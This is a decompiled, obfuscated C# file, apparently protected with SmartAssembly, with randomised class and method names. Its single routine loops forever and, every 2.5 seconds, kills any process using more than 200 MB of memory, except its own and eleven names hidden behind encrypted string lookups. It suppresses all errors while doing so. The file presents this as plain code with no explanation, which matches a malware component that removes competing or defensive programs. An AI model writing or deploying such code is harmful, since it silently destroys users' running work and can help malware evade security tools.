using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace uBrdXrCSgnwM;

public static class JjkubgNPsnZGJJX
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void qhFCBUEZMkREk()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107409332)) && !process.ProcessName.Contains(getString_0(107409355)) && !process.ProcessName.Contains(getString_0(107408802)) && !process.ProcessName.Contains(getString_0(107408793)) && !process.ProcessName.Contains(getString_0(107408812)) && !process.ProcessName.Contains(getString_0(107408767)) && !process.ProcessName.Contains(getString_0(107408786)) && !process.ProcessName.Contains(getString_0(107408773)) && !process.ProcessName.Contains(getString_0(107408728)) && !process.ProcessName.Contains(getString_0(107408747)) && !process.ProcessName.Contains(getString_0(107408694)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static JjkubgNPsnZGJJX()
	{
		Strings.CreateGetStringDelegate(typeof(JjkubgNPsnZGJJX));
	}
}
